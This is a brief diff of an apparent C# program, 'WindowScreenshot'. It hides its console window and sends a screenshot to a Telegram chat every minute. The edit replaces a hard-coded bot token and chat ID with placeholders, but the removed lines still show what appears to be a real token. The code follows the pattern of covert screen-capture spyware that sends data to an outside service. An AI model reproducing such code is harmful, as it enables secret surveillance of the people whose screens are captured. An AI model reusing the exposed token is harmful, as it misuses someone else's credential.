@@ -22,7 +22,7 @@ namespace WindowScreenshot
         {
             FreeConsole();
 
-            _botClient = new TelegramBotClient("6530285040:AAFOZe4HLj89L-yHVkyJLKrtqO9H2PSpxx4");
+            _botClient = new TelegramBotClient("Your_Telegram_bot_Token");
 
             _botClient.StartReceiving();
 
@@ -46,7 +46,7 @@ namespace WindowScreenshot
       
                 InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");
 
-                await _botClient.SendPhotoAsync(2017110018,photo);
+                await _botClient.SendPhotoAsync("your_chat_id",photo);
 
                 Thread.Sleep(60000);
 
